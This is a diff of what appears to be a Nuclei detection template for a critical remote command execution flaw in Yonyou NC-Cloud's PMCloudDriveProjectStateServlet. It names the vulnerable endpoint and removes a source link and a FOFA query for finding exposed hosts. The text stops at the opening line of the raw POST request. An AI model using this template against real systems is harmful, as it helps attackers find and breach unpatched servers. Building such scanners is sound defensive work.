@@ -3,14 +3,8 @@ info:
   name: 用友NC-CloudPMCloudDriveProjectStateServlet存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9b9d529b8c7a403689b43c22fc8c68c3
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9b9d529b8c7a403689b43c22fc8c68c3
-    fofa: + fofa`app="用友-NC-Cloud"`
 http:
 - raw:
   - 'POST /service/~aert/PMCloudDriveProjectStateServlet HTTP/1.1
